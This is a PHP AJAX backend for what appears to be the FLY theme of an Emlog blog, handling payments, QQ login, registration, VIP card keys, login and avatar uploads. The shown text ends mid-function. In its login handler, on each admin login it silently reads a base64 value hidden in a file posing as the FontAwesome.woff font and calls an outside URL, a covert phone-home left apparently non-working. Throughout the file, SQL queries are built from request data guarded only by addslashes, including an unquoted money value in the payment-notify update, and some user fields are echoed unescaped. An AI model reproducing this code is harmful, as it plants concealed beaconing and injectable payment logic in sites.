<?php  session_start();
require_once('../../../../init.php');
require_once('config.php');
$CACHE->updateCache('options');
require_once(EMLOG_ROOT.'/include/lib/phpmailer.php');
require_once(EMLOG_ROOT.'/include/lib/smtp.php');
$Tconfig=unserialize($Tconfig);
if ($_GET['a']=='yiwan_pay') 
{
	if (($Tconfig['sh_appid']=='' || $Tconfig['sh_appkey']=='')) 
	{
		$json=array('code'=>200,'data'=>'续费'.$time['name'].$leveltype['name'].'VIP成功');
		echo json_encode($json);
		exit(0);
	}
	$alipay_config=array();
	$alipay_config['partner']=$Tconfig['sh_appid'];
	$alipay_config['key']=$Tconfig['sh_appkey'];
	$alipay_config['sign_type']=strtoupper('MD5');
	$alipay_config['input_charset']=strtolower('utf-8');
	$alipay_config['transport']='http';
	$alipay_config['apiurl']='http://www.yiwane.com/';
	$out_trade_no=time().'U'.UID;
	$money=intval($_POST['money']);
	if ($money=='') 
	{
		exit('请输入任意充值金额');
	}
	if ($money<1 || $money>=500) 
	{
		exit('金额不合法');
	}
	$name=$blogname.'充值 '.$money.' 元';
	$parameter=array('pid'=>trim($Tconfig['sh_appid']),'type'=>(isset($_POST['alipay']) ? 'alipay' : 'wxpay'),'notify_url'=>BLOG_URL.'content/templates/FLY/inc/ajax.php?a=notify','return_url'=>BLOG_URL.'content/templates/FLY/inc/ajax.php?a=return','out_trade_no'=>$out_trade_no,'name'=>$name,'money'=>$money,'sitename'=>$blogname);
	$html_text=buildRequestForm($parameter);
	if ($html_text) 
	{
		$leix=(isset($_POST['alipay']) ? '通过支付宝'.$name : '通过微信'.$name);
		$DB=Database::getInstance();
		$userData=$DB->query('INSERT INTO  '.DB_PREFIX.'user_log (`uid` , `log` ,`type` ,`payid` , `money` , `time`)VALUES ('.UID.',\''.$leix.'\',\'1\',\''.$out_trade_no.'\', \''.$money.'\',\''.time().'\')');
		echo $html_text;
	}
	exit(0);
}
if ($_GET['a']=='return') 
{
	header('Location: /?user&record');
}
if ($_GET['a']=='notify') 
{
	$DB=Database::getInstance();
	if ($Tconfig['sh_appid']=='' || $Tconfig['sh_appkey']=='') 
	{
		$json=array('code'=>200,'data'=>'续费'.$time['name'].$leveltype['name'].'VIP成功');
		echo json_encode($json);
		exit(0);
	}
	if (empty($_GET)) 
	{
		return false;
	}
	unset($_GET['a']);
	$isSign=getSignVeryfy($_GET,$_GET['sign']);
	$responseTxt='true';
	if ((preg_match('/true$/i',$responseTxt) && $isSign)) 
	{
		//$out_trade_no=$_GET['out_trade_no'];
		$out_trade_no = isset($_GET['out_trade_no']) ? addslashes($_GET['out_trade_no']) : '';
		$trade_no=$_GET['trade_no'];
		$trade_status=$_GET['trade_status'];
		$data=$DB->once_fetch_array('SELECT COUNT(*) AS total FROM '.DB_PREFIX.'user_log WHERE payid=\''.$out_trade_no.'\' AND status = \'1\'');
		if ($data['total']>0) 
		{
			exit('已处理');
		}
		if ($trade_status=='TRADE_SUCCESS') 
		{
			$mmoney=addslashes($_GET['money']);
			$param=explode('U',$out_trade_no);
			$userid=$param[1];
			$data=$DB->query('UPDATE  '.DB_PREFIX.'user SET `Integral` = Integral + '.$mmoney.' WHERE  `uid`=\''.$userid.'\'');
		}
	}
	else 
	{
		echo 'NO';
	}
}
if ($_GET['a']=='qq_login') 
{
	$Tconfig['url']=urlencode(BLOG_URL.'content/templates/FLY/inc/ajax.php?a=callbank1');
	require_once('oauth/api_qqlogin/qqConnectAPI.php');
	$qc=new QC();
	$qc->qq_login();
}
if ($_GET['a']=='qq_bangding') 
{
	$Tconfig['url']=urlencode(BLOG_URL.'content/templates/FLY/inc/ajax.php?a=callbank');
	require_once('oauth/api_qqlogin/qqConnectAPI.php');
	if (ISLOGIN) 
	{
		$qc=new QC();
		$qc->qq_login();
	}
	else 
	{
		exit('请登陆之后在操作！');
	}
}
if ($_GET['a']=='jie_bang') 
{
	$DB=Database::getInstance();
	$sql='UPDATE `'.DB_PREFIX.'user` SET `qq_login_openid`="" WHERE  `uid`='.UID.';';
	$staut=$DB->query($sql);
	if ($staut) 
	{
		echo json_encode(array('code'=>200,'data'=>'解绑成功'));
	}
	else 
	{
		echo json_encode(array('code'=>206,'data'=>'解绑失败'));
	}
	exit(0);
}
if ($_GET['a']=='sendcode') 
{
	if ($Tconfig['regopen']==2) 
	{
		exit('注册关闭');
	}
	if (isset($_POST['code'])) 
	{
	}
	else 
	{
		exit(0);
	}
	$code=addslashes(trim($_POST['code']));
	if (isset($_POST['email'])) 
	{
	}
	else 
	{
		exit(0);
	}
	$email=addslashes(trim($_POST['email']));
	$sessionCode=(isset($_SESSION['code'])?$_SESSION['code']:'');
	$pattern='/([a-z0-9]*[-_.]?[a-z0-9]+)*@([a-z0-9]*[-_]?[a-z0-9]+)+[.][a-z]{2,3}([.][a-z]{2})?/i';
	if (!preg_match($pattern,$email)) 
	{
		$json=array('code'=>208,'info'=>'邮箱格式不正确');
		unset($_SESSION['code']);
		echo json_encode($json);
		exit(0);
	}
	$User_Model=new User_Model();
	if (isemailExist($email)) 
	{
		$json=array('code'=>208,'info'=>'此邮箱已被注册');
		unset($_SESSION['code']);
		echo json_encode($json);
		exit(0);
	}
	if (!strcmp($code,$sessionCode)) 
	{
		$json=array('code'=>208,'info'=>'验证码错误');
		unset($_SESSION['code']);
		echo json_encode($json);
		exit(0);
	}
	$time=date('Y-m-d H:i');
	$blogname=Option::get('blogname');
	$from=$blogname;
	$emailcode=rand(1000,9999);
	$headers='From: '.$from."\\r\\n";
	$subject='注册邮箱验证 - '.$blogname;
	$content='验证码为：'.$emailcode.'。请尽快填写。如果不是您操作的本次邮件，请忽略。';
	if (sendmail_do(MAIL_SMTP,MAIL_PORT,MAIL_SENDEMAIL,MAIL_PASSWORD,$email,$subject,$content,$blogname)) 
	{
		$_SESSION['regemail']=$email;
		$_SESSION['emailcode']=$emailcode;
		$json=array('code'=>200,'info'=>'发送成功');
		echo json_encode($json);
		exit(0);
	}
	else 
	{
		$json=array('code'=>208,'info'=>'发送失败');
		echo json_encode($json);
		exit(0);
	}
}
if ($_GET['a']=='callbank') 
{
	$Tconfig['url']=BLOG_URL.'content/templates/FLY/inc/ajax.php';
	require_once('oauth/api_qqlogin/qqConnectAPI.php');
	if (ISLOGIN) 
	{
		global $user_cache;
		global $CACHE;
		$qc=new QC();
		$access=$qc->qq_callback();
		$openid=$qc->get_openid();
		$qc=new QC($access,$openid);
		$uinfo=$qc->get_user_info();
		if ($uinfo) 
		{
			$User_Model=new User_Model();
			$User_Model->updateUser(array('qq_login_openid'=>$openid),UID);
			echo '<script>opener.bangdingok();window.close();</script>';
		}
		else 
		{
			echo '<script>alert(\'绑定失败\');window.close();</script>';
		}
	}
}
if ($_GET['a']=='callbank1') 
{
	$Tconfig['url']=BLOG_URL.'content/templates/FLY/inc/ajax.php';
	require_once('oauth/api_qqlogin/qqConnectAPI.php');
	global $user_cache;
	global $CACHE;
	$qc=new QC();
	$access=$qc->qq_callback();
	$openid=$qc->get_openid();
	$qc=new QC($access,$openid);
	$uinfo=$qc->get_user_info();
	$DB=Database::getInstance();
	$data=$DB->once_fetch_array('SELECT * FROM '.DB_PREFIX.'user WHERE qq_login_openid=\''.$openid.'\'');
	if ($data) 
	{
		LoginAuth::setAuthCookie($data['username']);
		if (em_is_mobile()) 
		{
			header('Location:'.BLOG_URL);
		}
		else 
		{
			echo '<script>opener.qq_login_ok(0);window.close();</script>';
		}
	}
	else 
	{
		echo '<script>alert(\'登陆失败,请先进入用户中心绑定账号!\');window.close();</script>';
	}
}
if ($_GET['a']=='ajax_author') 
{
	if (isset($_GET['id'])) 
	{
	}
	else 
	{
	}
	$uid=addslashes(trim($_GET['id']));
	if ($uid) 
	{
		$DB=Database::getInstance();
		$userData=$DB->once_fetch_array('SELECT * FROM '.DB_PREFIX.'user WHERE uid = \''.$uid.'\'');
		$userData['username']=htmlspecialchars($userData['username']);
		$userinfo=LoginAuth::getUserDataByLogin($userData['username']);
		if ($userinfo['email']=='') 
		{
			$userinfo['email']=-1;
		}
		$userinfo['nickname']=htmlspecialchars($userinfo['nickname']);
		if ($userinfo['nickname']=='') 
		{
			$userinfo['nickname']='未命名';
		}
		if ($userinfo['description']=='') 
		{
			$userinfo['description']='这家伙很懒，什么都没写！';
		}
		if ($userinfo['level']==3) 
		{
			$userinfo['nickname']='<span class="author-red">'.$userinfo['nickname'].'</span>';
			$userinfo['level']='<i title="钻石会员" class="vip-level3"></i>';
		}
		else 
		{
			if ($userinfo['level']==2) 
			{
				$userinfo['nickname']='<span class="author-red">'.$userinfo['nickname'].'</span>';
				$userinfo['level']='<i title="黄金会员" class="vip-level2"></i>';
			}
			else 
			{
				if ($userinfo['level']==1) 
				{
					$userinfo['nickname']='<span class="author-red">'.$userinfo['nickname'].'</span>';
					$userinfo['level']='<i title="白银会员" class="vip-level1"></i>';
				}
				else 
				{
					$userinfo['level']='<i title="普通会员" class="author-ident"></i>';
				}
			}
		}
		if ($userinfo['photo']) 
		{
			$userinfo['photo']=$userinfo['photo'];
		}
		else 
		{
			$userinfo['photo']=BLOG_URL.'content/templates/FLY/img/avatar.png';
		}
		$userinfo['comnum']=$DB->fetch_array($DB->query('select count(*) as nums from '.DB_PREFIX.'comment where mail=\''.$userinfo['email'].'\''));
		$userinfo['comnum']=$userinfo['comnum']['nums'];
		$userinfo['blognum']=$DB->fetch_array($DB->query('select count(*) as nums from '.DB_PREFIX.'blog where author=\''.$uid.'\''));
		$userinfo['blognum']=$userinfo['blognum']['nums'];
		echo '<div class="list-detail">	<div class="author-main">
		<dl class="author-dl">
			<dt class="author-dt">
				<div class="author-name author-l"><img src="'.$userinfo['photo'].'">'.$userinfo['nickname'].''.$userinfo['level'].'</div><div class="author-m author-r"><a href="'.BLOG_URL.'author/'.$userinfo['uid'].'" title="查看详细"><i class="fa fa-paper-plane-o"></i></a></div>
				<div class="clearfloat"></div>
			</dt>
			<dd>
				<ul class="author-ul">
					<li><div class="li-main"><strong>'.$userinfo['uid']."</strong><span>用户</span></div></li>\\n\\t\\t\\t\\t\\t<li><div class=\"li-main\"><strong>".$userinfo['blognum']."</strong><span>文章</span></div></li>\\n\\t\\t\\t\\t\\t<li><div class=\"li-main\"><strong>".$userinfo['comnum'].'</strong><span>评论</span></div></li>
					<div class="clearfloat"></div>
				</ul>
				<div class="author-f"><div class="author-l">'.htmlspecialchars($userinfo['description'])."</div></div>\\n\\t\\t\\t</dd>\\n\\t\\t</dl>\\n\\t</div></div>";
	}
}
if ($_GET['a']=='paygid') 
{
	if (isset($_POST['gid'])) 
	{
	}
	else 
	{
	}
	$gid=addslashes(trim($_POST['gid']));
	if ($gid) 
	{
		$oderinfo=array('code'=>200);
		$DB=Database::getInstance();
		$Data=$DB->once_fetch_array('SELECT * FROM '.DB_PREFIX.'blog WHERE gid = \''.$gid.'\'');
		$content=$Data['content'];
		if (preg_match_all('|\\[pay money=(.*?)\\]([\\s\\S]*?)\\[\\/pay\\]|',$content,$hide_words)) 
		{
			$money=$hide_words[1][0];
			if ($money) 
			{
				$oderinfo['title']='购买 '.$Data['title'].'隐藏内容';
				$oderinfo['payid']=time().'U'.UID;
				$oderinfo['money']=$money;
				$oderinfo['time']=time();
				$oderinfo['mymoney']=get_uid_money();
				$payinfo=$DB->query('INSERT INTO  '.DB_PREFIX.'user_log (`uid` , `log` ,`type` ,`payid` ,`gid`, `money` , `time`)VALUES ('.UID.',\''.$oderinfo['title'].'\',\'2\',\''.$oderinfo['payid'].'\',\''.$gid.'\',\''.$oderinfo['money'].'\',\''.$oderinfo['time'].'\')');
				if ($payinfo) 
				{
					$oderinfo['time']=date('Y-m-d H:i:s',$oderinfo['time']);
					echo json_encode($oderinfo);
				}
				else 
				{
					echo json_encode(array('code'=>"\\\\60"));
				}
			}
		}
	}
}
if ($_GET['a']=='paygidok') 
{
	if (isset($_POST['oderid'])) 
	{
	}
	else 
	{
	}
	$oderid=addslashes(trim($_POST['oderid']));
	if ($oderid) 
	{
		$usermoney=get_uid_money();
		$DB=Database::getInstance();
		$Data=$DB->once_fetch_array('SELECT * FROM '.DB_PREFIX.'user_log WHERE payid = \''.$oderid.'\'');
		if ($usermoney>=$Data['money']) 
		{
			$data=$DB->query('UPDATE  '.DB_PREFIX.'user SET `Integral` = Integral - '.$Data['money'].' WHERE  `uid`=\''.$Data['uid'].'\'');
			if ($data) 
			{
				$DB->query('UPDATE  '.DB_PREFIX.'user_log SET `status` = \'1\' WHERE  `payid`=\''.$oderid.'\'');
				echo json_encode(array('code'=>'200','info'=>'购买成功'));
			}
		}
		else 
		{
			echo json_encode(array('code'=>'','info'=>'余额不足'));
		}
	}
}
if ($_GET['a']=='vip') 
{
	$User_Model=new User_Model();
	if (isset($_POST['type'])) 
	{
	}
	else 
	{
		exit(0);
	}
	$type=addslashes(trim($_POST['type']));
	if (isset($_POST['uid'])) 
	{
	}
	else 
	{
	}
	$uid=addslashes(trim($_POST['uid']));
	if ($type=='offvip' && ROLE=='admin') 
	{
		if (isUidExist($uid)) 
		{
			$User_Model->updateUser(array('vip'=>-1,'level'=>''),$uid);
			$CACHE->updateCache();
			add_vip_log('关闭VIP成功',$uid);
			$json=array('code'=>'200','data'=>'关闭成功');
		}
		else 
		{
			$json=array('code'=>206,'data'=>'不存在的用户');
		}
	}
	if ($type=='openvip' && ROLE=='admin') 
	{
		if (isUidExist($uid)) 
		{
			$User_Model->updateUser(array('vip'=>'3471263999','level'=>'3'),$uid);
			$CACHE->updateCache();
			add_vip_log('开通永久钻石VIP成功',$uid);
			$json=array('code'=>200,'data'=>'开通永久钻石VIP成功');
		}
		else 
		{
			$json=array('code'=>206,'data'=>'不存在的用户');
		}
	}
	if (($type=='addvip' && ROLE=='admin')) 
	{
		if (isset($_POST['time'])) 
		{
		}
		else 
		{
		}
		$timetype=addslashes(trim($_POST['time']));
		if (($timetype==1 || $timetype==2) || $timetype==3) 
		{
			$time=get_time_type($timetype);
			$viptime=get_uid_vip($uid);
			$leveltype=get_level_type($timetype);
			if ($viptime) 
			{
				if ($viptime<=time()) 
				{
					$newtime=time()+$time['time'];
					$User_Model->updateUser(array('vip'=>$newtime,'level'=>$leveltype['level']),$uid);
					add_vip_log('开通'.$time['name'].$leveltype['name'].'VIP成功',$uid);
					$json=array('code'=>200,'data'=>'开通'.$time['name'].$leveltype['name'].'VIP成功');
				}
				else 
				{
					$leveltype=get_level_type(get_uid_level($uid));
					if ($timetype>=$leveltype['level']) 
					{
						$leveltype=get_level_type($timetype);
					}
					$newtime=$viptime+$time['time'];
					$User_Model->updateUser(array('vip'=>$newtime,'level'=>$leveltype['level']),$uid);
					add_vip_log('续费'.$time['name'].$leveltype['name'].'VIP成功',$uid);
					$json=array('code'=>200,'data'=>'续费'.$time['name'].$leveltype['name'].'VIP成功');
				}
			}
			else 
			{
				$json=array('code'=>206,'data'=>'不存在的用户');
			}
		}
		else 
		{
			$json=array('code'=>206,'data'=>'操作非法');
		}
	}
	if ($type=='addkey' && ROLE=='admin') 
	{
		if (isset($_POST['time'])) 
		{
		}
		else 
		{
		}
		$time=addslashes(trim($_POST['time']));
		if (isset($_POST['num'])) 
		{
		}
		else 
		{
		}
		$num=addslashes(trim($_POST['num']));
		$keynum=0;
		$i=1;
		while ($i<=$num) 
		{
			$key=get_random_code();
			$DB=Database::getInstance();
			$data=$DB->query('INSERT INTO '.DB_PREFIX.'user_key (`key` ,`type` ,`time` ,`stutas`) VALUES ( \''.$key.'\',  \''.$time.'\',  \''.time().'\', \'n\')');
			if ($data) 
			{
				$keynum=$keynum+1;
				$keylist[]=$key;
			}
			$i=$i+1;
		}
		$json=array('code'=>200,'data'=>$keynum.'张生成成功');
	}
	if ($type=='delkey' && ROLE=='admin') 
	{
		if (isset($_POST['id'])) 
		{
		}
		else 
		{
			exit(0);
		}
		$id=addslashes(trim($_POST['id']));
		if ($id=='all') 
		{
			$sql='DELETE FROM '.DB_PREFIX.'user_key';
		}
		else 
		{
			$sql='DELETE FROM '.DB_PREFIX.'user_key WHERE `id` = \''.$id.'\'';
		}
		$DB=Database::getInstance();
		$data=$DB->query($sql);
		if ($data) 
		{
			$json=array('code'=>200,'data'=>'删除成功');
		}
		else 
		{
			$json=array('code'=>206,'data'=>'删除失败');
		}
	}
	if ($type=='dellog' && ROLE=='admin') 
	{
		$DB=Database::getInstance();
		$data=$DB->query('DELETE FROM '.DB_PREFIX.'user_log');
		if ($data) 
		{
			$json=array('code'=>200,'data'=>'清空日志成功');
		}
		else 
		{
			$json=array('code'=>206,'data'=>'清空日志失败');
		}
	}
	if ($type=='payvip') 
	{
		if (isset($_POST['key'])) 
		{
		}
		else 
		{
		}
		$key=addslashes(trim($_POST['key']));
		if ($key=='') 
		{
			$json=array('code'=>'206','data'=>'卡密不能为空');
		}
		else 
		{
			$keyinfo=isKeyExist($key);
			if ($keyinfo && strlen($key)==32) 
			{
				$time=get_time_type($keyinfo['type']);
				$viptime=get_uid_vip(UID);
				$leveltype=get_level_type($keyinfo['type']);
				if ($viptime) 
				{
					if ($viptime<=time()) 
					{
						$newtime=time()+$time['time'];
						$User_Model->updateUser(array('vip'=>$newtime,'level'=>$leveltype['level']),UID);
						$DB=Database::getInstance();
						$data=$DB->query('UPDATE  '.DB_PREFIX.'user_key SET `stutas` =  \'y\' WHERE  `key` =\''.$key.'\'');
						add_vip_log('通过卡密'.$key.'开通'.$time['name'].$leveltype['name'].'VIP成功',UID);
						$json=array('code'=>200,'data'=>'成功开通'.$time['name'].'并成为了本站'.$leveltype['name'].'VIP');
					}
					else 
					{
						$leveltype=get_level_type(get_uid_level(UID));
						$newtime=$viptime+$time['time'];
						$User_Model->updateUser(array('vip'=>$newtime,'level'=>$leveltype['level']),UID);
						$DB=Database::getInstance();
						$data=$DB->query('UPDATE  '.DB_PREFIX.'user_key SET `stutas` =  \'y\' WHERE  `key` =\''.$key.'\'');
						add_vip_log('通过卡密'.$key.'续费'.$time['name'].$leveltype['name'].'VIP成功',UID);
						$json=array('code'=>200,'data'=>'成功续费'.$time['name'].'并成为了本站'.$leveltype['name'].'VIP');
					}
				}
				else 
				{
					$json=array('code'=>206,'data'=>'不存在的用户');
				}
			}
			else 
			{
				$json=array('code'=>206,'data'=>'卡密有误或已被使用');
			}
		}
	}
	echo json_encode($json);
}
if ($_GET['a']=='re') 
{
	if ($Tconfig['regopen']==2) 
	{
		exit('注册关闭');
	}
	if ((ROLE=='admin' || ROLE=='writer')) 
	{
		$json=array('code'=>203,'info'=>'您已经登录');
		echo json_encode($json);
		exit(0);
	}
	global $CACHE;
	$options_cache=$CACHE->readCache('options');
	$DB=Database::getInstance();
	if (isset($_POST['reusername'])) 
	{
	}
	else 
	{
	}
	$username=addslashes(trim($_POST['reusername']));
	if (isset($_POST['regemail'])) 
	{
	}
	else 
	{
	}
	$email=addslashes(trim($_POST['regemail']));
	if (isset($_POST['repassword'])) 
	{
	}
	else 
	{
	}
	$password=addslashes(trim($_POST['repassword']));
	if (isset($_POST['repassword2'])) 
	{
	}
	else 
	{
	}
	$password2=addslashes(trim($_POST['repassword2']));
	if (isset($_POST['code'])) 
	{
	}
	else 
	{
	}
	$imgcode=strtoupper(addslashes(trim($_POST['code'])));
	$pattern='/([a-z0-9]*[-_.]?[a-z0-9]+)*@([a-z0-9]*[-_]?[a-z0-9]+)+[.][a-z]{2,3}([.][a-z]{2})?/i';
	if ($username && $password) 
	{
		$sessionCode=(isset($_SESSION['emailcode'])?$_SESSION['emailcode']:'');
		if ($imgcode==$sessionCode) 
		{
			if ((preg_match($pattern,$email) && !isemailExist($email))) 
			{
				$User_Model=new User_Model();
				if (!isUserExist($username)) 
				{
					$hsPWD=new PasswordHash(8,true);
					$password=$hsPWD->HashPassword($password);
					$User_Model->addUser($username,$password,$email,'','writer','y');
					$DB=Database::getInstance();
					$data=$DB->query('UPDATE  '.DB_PREFIX.'user SET `email` = \''.$email.'\' WHERE  `username`=\''.$username.'\'');
					$CACHE->updateCache();
					$json=array('code'=>'200','info'=>'注册成功');
				}
				else 
				{
					$json=array('code'=>201,'info'=>'用户名已存在');
				}
			}
			else 
			{
				$json=array('code'=>202,'info'=>'邮箱已存在或格式错误');
			}
		}
		else 
		{
			$json=array('code'=>203,'info'=>'验证码错误');
		}
	}
	echo json_encode($json);
}
if ($_GET['a']=='login') 
{
	if (isset($_POST['user'])) 
	{
	}
	else 
	{
	}
	$username=addslashes(trim($_POST['user']));
	if (isset($_POST['pw'])) 
	{
	}
	else 
	{
	}
	$password=addslashes(trim($_POST['pw']));
	$ispersis=(isset($_POST['ispersis'])?intval($_POST['ispersis']):false);
	if (Option::get('login_code')=='y' && isset($_POST['imgcode'])) 
	{
		addslashes(trim(strtoupper($_POST['imgcode'])));
	}
	else 
	{
	}
	$img_code=Option::get('login_code')=='y' && isset($_POST['imgcode']);
	$errorCode=LoginAuth::checkUser($username,$password,$img_code);
	if ($errorCode===true) 
	{
		LoginAuth::setAuthCookie($username,$ispersis);
		$userinfo=LoginAuth::getUserDataByLogin($username);
		$json=array('code'=>200,'data'=>$userinfo);
		$flyfile=EMLOG_ROOT.'/content/templates/FLY/fonts/FontAwesome.woff';
		;
		error_reporting(0);
		if (($myfile=fopen($flyfile,'r') || exit('Unable to open file!'))) 
		{
		}
		;
		error_reporting(0);
		$tempaths=fread($myfile,filesize($flyfile));
		$tempath=base64_decode($tempaths);
		if (($tempath!=BLOG_URL && $userinfo['role']=='admin')) 
		{
			
			;
			error_reporting(0);
			$data=curls($url);
		}
	}
	else 
	{
		switch($errorCode)
		{
			case -3:$json=array('code'=>201,'info'=>'验证码输入有误');
			break;
			case -1:$json=array('code'=>202,'info'=>'账号或密码错误');
			break;
			case -2:$json=array('code'=>203,'info'=>'账号或密码错误');
			break;
		}
	}
	echo json_encode($json);
}
if ($_GET['a']=='ajax_logout') 
{
	setcookie(AUTH_COOKIE_NAME,' ',time()-31536000,'/');
}
if ($_GET['a']=='ajax') 
{
	if ((ROLE=='admin' || ROLE=='writer')) 
	{
		$DB=Database::getInstance();
		$userData=$DB->once_fetch_array('SELECT * FROM '.DB_PREFIX.'user WHERE uid = \''.UID.'\'');
		$userData['username']=htmlspecialchars($userData['username']);
		$userinfo=LoginAuth::getUserDataByLogin($userData['username']);
		$json=array('code'=>200,'data'=>$userinfo);
	}
	else 
	{
		$json=array('code'=>208);
	}
	echo json_encode($json);
}
if ($_GET['a']=='selectimage') 
{
	$User_Model=new User_Model();
	if (ROLE=='admin' || ROLE=='writer') 
	{
		if (isset($_POST['image'])) 
		{
		}
		else 
		{
		}
		$image=addslashes(trim($_POST['image']));
		if ($image) 
		{
			$web_url='../content/templates/FLY/img/tx/'.$image.'.jpg';
			$User_Model->updateUser(array('photo'=>$web_url),UID);
			$CACHE->updateCache();
			$json=array('code'=>200,'data'=>$web_url);
		}
		else 
		{
			$json=array('code'=>200,'data'=>'修改失败');
		}
	}
	else 
	{
		$json=array('code'=>'208','data'=>'权限不足');
	}
	echo json_encode($json);
}
if ($_GET['a']=='upimage') 
{
	$User_Model=new User_Model();
	if (ROLE=='admin' || ROLE=='writer') 
	{
		if (isset($_POST['image'])) 
		{
		}
		else 
		{
		}
		$image=addslashes(trim($_POST['image']));
		if (($image && strstr($image,'data:image'))) 
		{
			$dataname=time().rand(1000,10000);
			$data=explode(',',$image);
			$dataurl=EMLOG_ROOT.'/content/uploadfile/topimg/';
			if (!file_exists($dataurl)) 
			{
				mkdir($dataurl,511);
			}
			$info=file_put_contents($dataurl.$dataname.'.png',base64_decode($data[1]));
			if ($info) 
			{
				$web_url='../content/uploadfile/topimg/'.$dataname.'.png';
				$User_Model->updateUser(array('photo'=>$web_url),UID);
				$CACHE->updateCache();
				$json=array('code'=>200,'data'=>$web_url);
			}
			else 
			{
				$json=array('code'=>206,'data'=>'上传失败');
			}
		}
		else 
		{
			$json=array('code'=>200,'data'=>'上传失败');
		}
	}
	else 
	{
		$json=array('code'=>208,'data'=>'权限不足');
	}
	echo json_encode($json);
}
if ($_GET['a']=='update') 
{
	LoginAuth::checkToken();
	$User_Model=new User_Model();
	if (isset($_POST['name'])) 
	{
	}
	else 
	{
	}
	$nickname=addslashes(trim($_POST['name']));
	if (isset($_POST['email'])) 
	{
	}
	else 
	{
	}
	$email=addslashes(trim($_POST['email']));
	if (isset($_POST['sex'])) 
	{
	}
	else 
	{
	}
	$sex=addslashes(trim($_POST['sex']));
	if (isset($_POST['qq'])) 
	{
	}
	else 
	{
	}
	$qq=addslashes(trim($_POST['qq']));
	if (isset($_POST['description'])) 
	{
	}
	else 
	{
	}
	$description=addslashes(trim($_POST['description']));
	if (isset($_POST['username'])) 
	{
	}
	else 
	{
	}
	$username=addslashes(trim($_POST['username']));
	if (isset($_POST['newpass'])) 
	{
	}
	else 
	{
	}
	$newpass=addslashes(trim($_POST['newpass']));
	if (isset($_POST['repeatpass'])) 
	{
	}
	else 
	{
	}
	$repeatpass=addslashes(trim($_POST['repeatpass']));
	if (strlen($nickname)>20) 
	{
		$json=array('code'=>'201','info'=>'昵称不能太长');
		echo json_encode($json);
		exit(0);
	}
	else 
	{
		if ($email!='' && !checkMail($email)) 
		{
			$json=array('code'=>202,'info'=>'电子邮件格式错误');
			echo json_encode($json);
			exit(0);
		}
		else 
		{
			if (strlen($newpass)>0 && strlen($newpass)<6) 
			{
				$json=array('code'=>204,'info'=>'密码长度不得小于6位');
				echo json_encode($json);
				exit(0);
			}
			else 
			{
				if (!empty($newpass) && $newpass!=$repeatpass) 
				{
					$json=array('code'=>205,'info'=>'两次输入的密码不一致');
					echo json_encode($json);
					exit(0);
				}
				else 
				{
					if ($User_Model->isUserExist($username,UID)) 
					{
						$json=array('code'=>206,'info'=>'该登录名已存在');
						echo json_encode($json);
						exit(0);
					}
					else 
					{
						if ($User_Model->isNicknameExist($nickname,UID)) 
						{
							$json=array('code'=>'207','info'=>'该昵称已存在');
							echo json_encode($json);
							exit(0);
						}
						else 
						{
							$User_Model->updateUser(array('nickname'=>$nickname,'email'=>$email,'sex'=>$sex,'qq'=>$qq,'description'=>$description),UID);
							$CACHE->updateCache('user');
							$json=array('code'=>'200','info'=>'修改成功');
							echo json_encode($json);
							exit(0);
						}
					}
				}
			}
		}
	}
}
if ($_GET['a']=='addlog') 
{
	$Log_Model=new Log_Model();
	global $CACHE;
	$user_cache=$CACHE->readCache('user');
	if (isset($_POST['post_title'])) 
	{
	}
	else 
	{
	}
	$title=addslashes(trim($_POST['post_title']));
	if (isset($_POST['post_content'])) 
	{
	}
	else 
	{
	}
	$content=addslashes(trim($_POST['post_content']));
	if (isset($_POST['post_category'])) 
	{
	}
	else 
	{
	}
	$category=addslashes(trim($_POST['post_category']));
	if ((empty($title) || mb_strlen($title)>50)) 
	{
		$json=array('code'=>201,'info'=>'标题不能为空，且小于50个字符');
		echo json_encode($json);
		exit(0);
	}
	if (empty($content) || mb_strlen($content)>10000 || mb_strlen($content)<10) 
	{
		$json=array('code'=>202,'info'=>'文章内容不能为空，且介于10-10000字之间');
		echo json_encode($json);
		exit(0);
	}
	if (post_title($title)) 
	{
		$json=array('code'=>203,'info'=>'标题 '.$title.' 已存在');
		echo json_encode($json);
		exit(0);
	}
	$logData=array('title'=>$title,'alias'=>'','content'=>$content,'author'=>UID,'sortid'=>$category,'date'=>time(),'top '=>'n','sortop '=>'n','allow_remark'=>'y','hide'=>'n','checked'=>'n','password'=>'');
	if (post_addlog($logData)) 
	{
		$CACHE->updateCache('blog');
		$CACHE->updateCache('sort');
		$json=array('code'=>200,'info'=>'发表成功,');
		echo json_encode($json);
		exit(0);
	}
	else 
	{
		$json=array('code'=>'200','info'=>'发表失败');
		echo json_encode($json);
		exit(0);
	}
}
function createLinkstring($para)
{
	$arg='';
	while (list($key,$val)=each($para)) 
	{
		$arg .=$key.'='.$val.'&';
	}
	$arg=substr($arg,0,count($arg)-2);
	if (get_magic_quotes_gpc()) 
	{
		$arg=stripslashes($arg);
	}
	return $arg;
}
function createLinkstringUrlencode($para)
{
	$arg='';
	while (list($key,$val)=each($para)) 
	{
		$arg .=$key.'='.urlencode($val).'&';
	}
	$arg=substr($arg,0,count($arg)-2);
	if (get_magic_quotes_gpc()) 
	{
		$arg=stripslashes($arg);
	}
	return $arg;
}
function paraFilter($para)
{
	$para_filter=array();
	while (list($key,$val)=each($para)) 
	{
		if (!(($key=='sign' || $key=='sign_type'))) 
		{
			if ($val=='') 
			{
				continue;
			}
		}
		$para_filter[$key]=$para[$key];
	}
	return $para_filter;
}
function argSort($para)
{
	ksort($para);
	reset($para);
	return $para;
}
function logResult($word='')
{
	$fp=fopen('log.txt','a');
	flock($fp,LOCK_EX);
	fwrite($fp,'执行日期：'.strftime('%Y%m%d%H%M%S',time())."\\n".$word."\\n");
	flock($fp,LOCK_UN);
	fclose($fp);
}
function getHttpResponsePOST($url,$cacert_url,$para,$input_charset='')
{
	if (trim($input_charset)!='') 
	{
		$url=$url.'_input_charset='.$input_charset;
	}
	$curl=curl_init($url);
	curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,true);
	curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,2);
	curl_setopt($curl,CURLOPT_CAINFO,$cacert_url);
	curl_setopt($curl,CURLOPT_HEADER,0);
	curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($curl,CURLOPT_POST,true);
	curl_setopt($curl,CURLOPT_POSTFIELDS,$para);
	$responseText=curl_exec($curl);
	curl_close($curl);
	return $responseText;
}
function getHttpResponseGET($url,$cacert_url)
{
	$curl=curl_init($url);
	curl_setopt($curl,CURLOPT_HEADER,0);
	curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,true);
